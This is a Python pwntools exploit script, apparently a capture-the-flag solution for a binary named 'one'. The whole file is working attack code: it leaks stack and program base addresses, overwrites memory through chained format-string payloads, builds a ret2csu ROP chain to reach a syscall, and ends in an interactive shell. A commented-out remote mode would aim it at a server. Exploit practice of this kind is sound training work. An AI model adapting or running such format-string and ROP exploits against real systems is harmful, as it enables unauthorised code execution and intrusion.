# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './one'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def csu( call_addr ,rdi , rsi , rdx , base):
    pop_rbx_r15_ret = 0x153A + base
    mov_call = 0x1520 + base
    arg = flat(
        0 , 1 , 
        rdi , rsi , rdx, call_addr,
    )
    return flat(pop_rbx_r15_ret , arg , mov_call) 

# one_gad = one_gadget(libc.path)

def attack():
    
    ru('0x')
    stack_addr = rint() + 0x818

    sa('username:' , 'a'*8)
    # dbg()
    sa('password:' , 'a'*8)

    ru('a'*8)
    elf_base = (uu64(6) & 0xfffffffff000) - 0x1000

    syscall = 0x1e4d94
    mov_call = 0x1520 + elf_base
    pop_rbx_r15_ret = 0x153A + elf_base
    syscall_addr = elf_base + 0x50e8
    rop_addr = elf_base + 0x5100
    printf_addr = elf_base + 0x3fb0

    payload = ("%16c%15$hhn" + "%132c%16$hhn" + "%" + str(0xf7 - 0x94) + "c" + "%17$hhn" + "%" + str(0xfd - 0xf7) + "c" + "%18$hhn").ljust( 0x48 , 'a') 
    payload += p64(stack_addr)

    payload += p64(syscall_addr)
    payload += p64(syscall_addr+2)
    payload += p64(syscall_addr+1)

    lg('stack_addr' , stack_addr)
    lg('elf_base' , elf_base)

    # dbg('*$rebase(0x00000000000014B9)')
    sla('see anything!!!' , payload)
    
    se('a'*0x8)
    se('a'*0x8)

    payload = ("%65$na%66$na%67$n" + "%14c%68$hhn").ljust(0x20 , 'a')
    payload += fmtstr_payload(10 ,{
            rop_addr:pop_rbx_r15_ret,
            # rop_addr+0x8:0,
            # rop_addr+0x10:1,
            # rop_addr+0x18:2,
            rop_addr+0x20:printf_addr,
            rop_addr+0x28:0x99,
            rop_addr+0x30:syscall_addr,
            rop_addr+0x38:mov_call,
        },numbwritten = 20, write_size='byte')
    payload += flat(
        rop_addr+0x8,
        rop_addr+0x10,
        rop_addr+0x18,
        stack_addr
    )

    # dbg('*$rebase(0x00000000000014B9)')
    sl(payload)
    
    se('a'*0x8)
    se('a'*0x8)

    payload = fmtstr_payload(6 ,{
            stack_addr:pop_rbx_r15_ret,
            stack_addr+0x8:0,
            stack_addr+0x10:1,
            stack_addr+0x18:0,
            stack_addr+0x20: rop_addr,
            stack_addr+0x28:0x99,
            stack_addr+0x30:syscall_addr,
            stack_addr+0x38:mov_call,
    },numbwritten = 0, write_size='byte')

    dbg('*$rebase(0x00000000000014B9)')
    sl(payload)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   one.py
@Time    :   2022/07/02 10:54:37
@Author  :   Niyah 
'''